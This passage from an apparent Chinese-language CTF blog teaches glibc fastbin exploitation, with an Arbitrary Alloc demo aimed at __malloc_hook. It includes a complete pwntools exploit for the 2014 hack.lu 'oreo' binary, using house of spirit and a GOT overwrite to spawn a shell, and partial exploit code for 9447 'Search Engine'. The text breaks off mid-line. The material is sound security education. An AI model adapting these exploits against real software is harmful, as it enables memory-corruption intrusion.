class="line">0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br></pre></td></tr></table></figure><h3 id="小总结-2"><a href="#小总结-2" class="headerlink" title="小总结"></a>小总结</h3><p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><h3 id="演示-3"><a href="#演示-3" class="headerlink" title="演示"></a>演示</h3><p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到**_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    void *chunk1;</span><br><span class="line">    void *chunk_a;</span><br><span class="line"></span><br><span class="line">    chunk1&#x3D;malloc(0x60);</span><br><span class="line"></span><br><span class="line">    free(chunk1);</span><br><span class="line"></span><br><span class="line">    *(long long *)chunk1&#x3D;0x7ffff7dd1af5-0x8;</span><br><span class="line">    malloc(0x60);</span><br><span class="line">    chunk_a&#x3D;malloc(0x60);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0</span><br></pre></td></tr></table></figure><p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;这里的size指用户区域，因此要小2倍SIZE_SZ</span><br><span class="line">Fastbins[idx&#x3D;0, size&#x3D;0x10]</span><br><span class="line">Fastbins[idx&#x3D;1, size&#x3D;0x20]</span><br><span class="line">Fastbins[idx&#x3D;2, size&#x3D;0x30]</span><br><span class="line">Fastbins[idx&#x3D;3, size&#x3D;0x40]</span><br><span class="line">Fastbins[idx&#x3D;4, size&#x3D;0x50]</span><br><span class="line">Fastbins[idx&#x3D;5, size&#x3D;0x60]</span><br><span class="line">Fastbins[idx&#x3D;6, size&#x3D;0x70]</span><br></pre></td></tr></table></figure><p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line"></span><br><span class="line">0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f</span><br></pre></td></tr></table></figure><p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">##define fastbin_index(sz)                                                      \</span><br><span class="line">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ &#x3D;&#x3D; 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure><p>（注意 sz 的大小是 unsigned int，因此只占 4 个字节）</p><p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook 的内容 (在我的 libc 中__realloc_hook 与__malloc_hook 是在连在一起的)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line"> →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line"> $rax   : 0x7ffff7dd1afd</span><br><span class="line"></span><br><span class="line">0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f</span><br><span class="line">0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f</span><br><span class="line">0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="小总结-3"><a href="#小总结-3" class="headerlink" title="小总结"></a>小总结</h3><p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><p>程序比较古老，32 位的堆题</p><pre><code>Arch:     i386-32-littleRELRO:    No RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>存储枪支信息结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rifle</span> &#123;</span></span><br><span class="line">description <span class="comment">//从0字节开始</span></span><br><span class="line">name <span class="comment">//从25字节开始</span></span><br><span class="line">pre_rifle_ptr <span class="comment">//从52字节开始</span></span><br><span class="line">&#125; <span class="comment">//总共56字节</span></span><br></pre></td></tr></table></figure><ul><li><p>添加枪支，会读取枪支的名字与描述。读取的名字的长度为 56 ，可以覆盖后面堆块的数据。需要注意的是，枪支信息堆块大小固定为 0x40 （含chunk_header）。</p></li><li><p>展示添加枪支，即从头到尾输出枪支的描述与名字。</p></li><li><p><del>订已经选择的枪支，即将所有已经添加的枪支释放掉，但是并没有置为 NULL。</del>将最后添加的枪支释放，然后在释放当前堆最后 4 字节指向的内存地址，如果为 0 则结束释放。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;20wx 0x0804b858-0x8</span><br><span class="line">0x804b850:0x000000000x000000410x646464640x64646464</span><br><span class="line">0x804b860:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804b870:0x636363000x636363630x000000630x00000000</span><br><span class="line">0x804b880:0x000000000x000000000x000000000x0804b818&lt;--指向下一个堆</span><br><span class="line">0x804b890:0x000000000x000207710x000000000x00000000</span><br></pre></td></tr></table></figure></li><li><p>留下订货消息</p></li><li><p>展示目前状态，即添加了多少只枪，订了多少单，留下了什么信息。</p></li></ul><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>create 的时候 name 和 description 都存在溢出的情况，两者可输入长度都是 56 字节。修改两者都是可以修改 chunk 指向的下一个 chunk 地址，也就是最后 4 字节，修改 desc 时还可以溢出修改下一个堆信息。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>没有打开 PIE ，一开始想着 double free 然后改 got 表地址泄露 getshell 一条龙。但是有个大问题，chunk_ptr 只保存最后申请 chunk 的指针信息，换句话说就是申请一个新的 chunk ，旧指针就会被覆盖了，指针丢失了，无法完成 double free 。</p><p>最终使用 house of spirit getshell 。</p><ol><li><p>申请一个 chunk ，通过溢出将某个函数 got 表地址写入最后 4 个字节，用输出功能泄露 libc 地址。</p></li><li><p>申请 0x40 个 chunk ，用于后续伪造 fastbin 绕过 size check 检查。</p></li><li><p>溢出修改 chunk 最后 4 字节的下一个 chunk 指针，指向 0x0804A2A8 notice_ptr ，这个是作为 fake chunk 的 fd 位。</p></li><li><p>布置 0x0804A2A8 后面的 chunk 信息绕过检查，前面的绕过伪造已经在第一步完成。</p></li><li><p>提交信息（free all chunk），fastbin 就会得到这样的一组指针：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span><br></pre></td></tr></table></figure><p> 到这里就得到一组任意写指针了。</p></li></ol><hr><p>申请 0x40 个 chunk 会记录在 chunk_num ，如果以 0x0804A2A8 为 fake chunk 的 fd 指针，那么 chunk_num 刚刚好就是 fake_chunk size 位：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;20wx 0x0804A2A0</span><br><span class="line">0x804a2a0:0x000000000x000000400x0804a2c00x00000000</span><br><span class="line">0x804a2b0:0x000000000x000000000x000000000x00000000</span><br></pre></td></tr></table></figure><p>申请第 0x40 的时候溢出修改最后 4 字节的下一 chunk 地址为 0x0804A2A8 。bypass fastbin size check 。</p><p>然后利用写入 notice 信息，布置 fake_chunk 后一个 chunk 信息，bypass 相关保护，完成 house  of spirit 布置。</p><p>写入内容就是就是：从 0x0804A2A8 + 0x30 开始写入下一个 chunk header 信息即可（prev_size = 0x40 , size = 0x100 ）。</p><p>当 free all chunk 时 fake chunk 就会通过检查，成功放入到 bin 中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span><br></pre></td></tr></table></figure><p>再次申请 chunk ，并写入函数地址，之后通过写入 notice 修改函数。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.binary = <span class="string">&quot;./oreo&quot;</span></span><br><span class="line">oreo = ELF(<span class="string">&quot;./oreo&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./oreo&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">descrip, name</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil(&#x27;Rifle name: &#x27;)</span></span><br><span class="line">    p.sendline(name)</span><br><span class="line">    <span class="comment">#p.recvuntil(&#x27;Rifle description: &#x27;)</span></span><br><span class="line">    <span class="comment">#sleep(0.5)</span></span><br><span class="line">    p.sendline(descrip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_rifle</span>():</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;===================================\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span>():</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>(<span class="params">notice</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil(&quot;Enter any notice you&#x27;d like to submit with your order: &quot;)</span></span><br><span class="line">    p.sendline(notice)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;step 1. leak libc base&#x27;</span></span><br><span class="line">    name = <span class="number">27</span> * <span class="string">&#x27;a&#x27;</span> + p32(oreo.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    add(<span class="number">25</span> * <span class="string">&#x27;a&#x27;</span>, name)</span><br><span class="line">    show_rifle()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;===================================\n&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">    puts_addr = u32(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;step 2. free fake chunk at 0x0804A2A8&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># now, oifle_cnt=1, we need set it = 0x40</span></span><br><span class="line">    oifle = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> oifle &lt; <span class="number">0x3f</span>:</span><br><span class="line">        <span class="comment"># set next link=NULL</span></span><br><span class="line">        add(<span class="number">25</span> * <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">27</span> + p32(<span class="number">0</span>))</span><br><span class="line">        oifle += <span class="number">1</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">27</span> + p32(<span class="number">0x0804a2a8</span>)</span><br><span class="line">    <span class="comment"># set next link=0x0804A2A8, try to free a fake chunk</span></span><br><span class="line">    add(<span class="number">25</span> * <span class="string">&#x27;b&#x27;</span>, payload)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    <span class="comment"># before free, we need to bypass some check</span></span><br><span class="line">    <span class="comment"># fake chunk&#x27;s size is 0x40</span></span><br><span class="line">    <span class="comment"># 0x20 *&#x27;a&#x27; for padding the last fake chunk</span></span><br><span class="line">    <span class="comment"># 0x40 for fake chunk&#x27;s next chunk&#x27;s prev_size</span></span><br><span class="line">    <span class="comment"># 0x100 for fake chunk&#x27;s next chunk&#x27;s size</span></span><br><span class="line">    <span class="comment"># set fake iofle&#x27; next to be NULL</span></span><br><span class="line">    payload = <span class="number">0x20</span> * <span class="string">&#x27;\x00&#x27;</span> + p32(<span class="number">0x40</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">    <span class="comment"># payload = payload.ljust(60, &#x27;b&#x27;)</span></span><br><span class="line">    <span class="comment"># payload += p32(0)</span></span><br><span class="line">    <span class="comment"># payload = payload.ljust(128, &#x27;c&#x27;)</span></span><br><span class="line">    message(payload)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment"># fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span></span><br><span class="line">    order()</span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Okay order submitted!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;step 3. get shell&#x27;</span></span><br><span class="line">    <span class="comment"># modify free@got to system addr</span></span><br><span class="line">    payload = p32(oreo.got[<span class="string">&#x27;strlen&#x27;</span>]).ljust(<span class="number">20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(payload, <span class="string">&#x27;b&#x27;</span> * <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    message(p32(system_addr) + <span class="string">&#x27;||/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://bbs.pediy.com/thread-247214-1.htm">[原创]2014 hack.lu oreo</a></p></blockquote><h2 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h2><h3 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h3><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)FORTIFY:  Enabled</code></pre><p>程序没有 setbuf ，会自动申请 chunk 存放输入缓冲数据。</p><h3 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h3><p>一个变种的堆管理器，算是有增删查功能。菜单两个入口：</p><ol><li>Search with a word</li><li>Index a sentence</li></ol><p>index 可以创建堆，大小自定义（小于 0xFFD），读取字符串长度必须等于给定的长度，输入字符串没有设置结束符 \x00 。</p><p>search 搜索句子，读取搜索字符串长度必须等给定长度，检索规则如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = chunk_list; i; i = *(_QWORD *)(i + <span class="number">0x20</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( **(_BYTE **)(i + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)(i + <span class="number">8</span>) == v0 &amp;&amp; !<span class="built_in">memcmp</span>(*(<span class="keyword">const</span> <span class="keyword">void</span> **)i, chunk_ptr, v0) )</span><br><span class="line">        &#123;</span><br></pre></td></tr></table></figure><p>具体结构体结构调试一下就能看到逻辑，0x28 那个就是结构体 chunk 。</p><p>首先是 sentence chunk 首字节不能为 \x00 ，然后根据 size 和 memcmp 搜索相同的 chunk 。</p><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>最明显的就是 double free ，在 search 找到对应 sentenc chunk 之后，选择释放完成后，并没有将结构体指针置零。</p><p>这个功能函数还有一个漏洞，释放 sentenc chunk 之前会使用 memset 将 chunk 全部置零，避免了检查被释放的 chunk （源码检查机制：<code>if ( **(_BYTE **)(i + 16) )</code>），但是当 chunk 放入 fastbin 非首个 chunk 或者是 unsortedbin 等时，会向 fd 、bk 写入地址信息，使得 sentenc chunk 首字节非 0 ，致使 search 时最终还是会搜索被释放的 chunk 。</p><p>还有漏洞就是写入 sentenc 的时候，如果写入长度刚刚好等于给出的写入长度，那么 sentenc 结尾不会补上结束符 \x00 。（网上有 wp 利用这个漏洞，泄露栈上的 libc 地址）</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>利用 free 之后没有置零指针，完成泄露 libc 地址，fastbin Arbitrary Alloc 修改 malloc_hook 为 onegadget 。</p><ol><li>申请一个非 fastbin 大小 chunk ，将其释放，fd 指针就会写入 libc 段地址。利用 search 搜索 <code>\x00</code> ，找到在 unsorted bin 中的 chunk ，程序会将 chunk 的 fd 指针给输出。</li><li>申请 3 个 fastbin chunk ，利用最后两个完成 Arbitrary Alloc 篡改 malloc_hook </li></ol><p>申请 0x88 unsorted bin chunk ，泄露 libc 地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Index(<span class="string">&#x27; m &#x27;</span>.rjust(<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">search(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">search(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Found 136: &#x27;</span>)</span><br><span class="line">unsortbin_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;unsortbin_addr:&quot;</span> + <span class="built_in">hex</span>(unsortbin_addr))</span><br></pre></td></tr></table></figure><p>Arbitrary Alloc 步骤：sky 三个 chunk 先释放到 fastbin 中，然后 double free k chunk ，完成修改链表。如果缺少 s chunk 只使用两个堆，double free 时报错：<code>double free or corruption (fasttop)</code>，此时被 double free chunk 的链首。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">search(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Found&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">search(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Found&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">search(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Found&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">search(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Found&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Found&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fakechunk_addr = malloc_hook - <span class="number">0x23</span></span><br><span class="line">Index(p64(fakechunk_addr).ljust(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">Index(<span class="string">&#x27; s &#x27;</span>.rjust(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">Index(<span class="string">&#x27; k &#x27;</span>.rjust(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">Index(p64(<span class="number">0xf1207</span>+libc_base).rjust(<span class="number">0x1b</span>,<span class="string">&#x27;a&#x27;</span>).ljust(<span class="number">0x68</span>,<span 